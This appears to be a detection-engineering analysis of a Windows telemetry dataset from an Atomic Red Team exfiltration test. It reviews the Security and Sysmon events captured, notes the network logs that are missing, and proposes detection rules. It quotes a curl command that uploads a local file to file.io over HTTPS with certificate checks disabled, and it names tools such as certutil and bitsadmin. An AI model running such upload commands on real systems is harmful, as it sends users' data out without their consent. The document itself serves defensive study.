# T1048.002-1: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol — Exfiltrate data HTTPS using curl windows

## Technique Context

T1048.002 (Exfiltration Over Asymmetric Encrypted Non-C2 Protocol) represents adversaries using encrypted protocols like HTTPS to exfiltrate data to external services, bypassing network monitoring that focuses on unencrypted traffic. This technique is particularly effective because HTTPS traffic is ubiquitous in enterprise environments, making malicious exfiltration blend in with legitimate web traffic.

Attackers commonly abuse this technique by uploading sensitive data to file-sharing services, cloud storage platforms, or paste sites over HTTPS connections. The encryption inherent in HTTPS makes it difficult for network security tools to inspect the actual data being transmitted without SSL/TLS inspection capabilities. Detection often relies on identifying unusual upload patterns, connections to known file-sharing services, or the use of command-line tools like curl in suspicious contexts.

The detection community focuses on monitoring for unusual network connections to file-sharing services, large data uploads, and the use of native system tools (like curl, wget, or PowerShell) for HTTP/HTTPS operations, especially when originating from system accounts or administrative contexts.

## What This Dataset Contains

This dataset captures a straightforward HTTPS exfiltration using Windows' built-in curl utility. The attack chain shows:

**Process Chain**: `powershell.exe` → `cmd.exe` → `curl.exe`

The Security 4688 events reveal the exact command execution:
- PowerShell spawns cmd.exe with: `"cmd.exe" /c C:\Windows\System32\Curl.exe -k -F "file=@C:\AtomicRedTeam\atomics/T1048.002/src/artifact" https://file.io/`
- cmd.exe then executes curl.exe with the full parameter set: `-k -F "file=@C:\AtomicRedTeam\atomics/T1048.002/src/artifact" https://file.io/`

The Sysmon data provides additional process creation details including hashes and parent-child relationships. Notably, the curl process (PID 2076) shows the technique T1105 (Ingress Tool Transfer) rule match, demonstrating Sysmon's ability to classify the behavior.

The dataset also captures PowerShell process access events (Sysmon EID 10) showing PowerShell accessing both the whoami.exe and cmd.exe child processes with full access rights (0x1FFFFF), which is typical for parent process monitoring of child execution.

## What This Dataset Does Not Container

The dataset lacks several critical detection data sources:

**Network telemetry**: No Sysmon network connection events (EID 3) are present, which would show the actual HTTPS connection to file.io. This is likely due to the sysmon-modular configuration filtering or the connection completing too quickly to capture.

**DNS queries**: No Sysmon EID 22 DNS query events for file.io resolution, missing a key network indicator.

**File access events**: No Sysmon EID 2 (File creation time changed) or detailed file access events showing curl reading the source artifact file.

**HTTPS inspection**: The encrypted nature of the connection means the actual file content and HTTP headers are not visible in the logs.

**PowerShell script content**: The PowerShell events only contain test framework boilerplate (Set-StrictMode, error handling scriptblocks), not the actual exfiltration command.

## Assessment

This dataset provides solid process-level telemetry for detecting command-line based HTTPS exfiltration but lacks the network-level evidence that would make detection more comprehensive. The Security event logs with command-line auditing are the strongest data source here, clearly showing the curl command with suspicious parameters like `-k` (ignore SSL certificates) and the file upload syntax.

The Sysmon process creation events complement the Security logs with additional metadata like file hashes and process relationships. However, the absence of network connection events significantly limits the dataset's utility for building comprehensive network-based detections.

For detection engineering focused on process behavior and command-line analysis, this dataset is quite valuable. For network-based detection development, additional data sources would be needed.

## Detection Opportunities Present in This Data

1. **Command-line curl file upload detection**: Alert on `curl.exe` executions with `-F` parameter patterns indicating file uploads, especially with suspicious flags like `-k` for certificate bypass.

2. **Suspicious process chain analysis**: Monitor for PowerShell spawning cmd.exe which then executes network utilities like curl, particularly from SYSTEM context.

3. **File upload to known hosting services**: Create signatures for curl commands targeting known file-sharing domains like file.io, especially with form-based upload syntax.

4. **Certificate validation bypass detection**: Alert on curl executions using `-k` or `--insecure` flags, which indicate intentional bypass of SSL certificate validation.

5. **LOLBIN network activity**: Monitor for built-in Windows utilities (curl, certutil, bitsadmin) being used for network operations, especially file uploads from system accounts.

6. **Process access pattern analysis**: Correlate Sysmon EID 10 events showing PowerShell accessing spawned network utility processes, indicating programmatic control of exfiltration tools.

7. **Atomic Red Team artifact detection**: Alert on access to paths matching known testing frameworks (C:\AtomicRedTeam\atomics) to identify security testing activities that may indicate actual attack emulation.
